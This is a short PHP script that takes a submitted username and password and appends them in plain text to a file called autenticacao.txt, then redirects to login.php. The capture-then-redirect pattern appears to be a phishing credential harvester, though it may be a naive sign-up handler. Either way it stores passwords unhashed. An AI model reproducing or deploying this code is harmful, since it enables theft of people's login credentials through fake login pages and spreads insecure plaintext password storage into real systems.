<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $username = $_POST['username'];
  $password = $_POST['password'];
  $arquivo = fopen("autenticacao.txt", "a");
  fwrite($arquivo, $username . ":" . $password . "\n");
  fclose($arquivo);
  header("Location: login.php");
  exit;
}
?>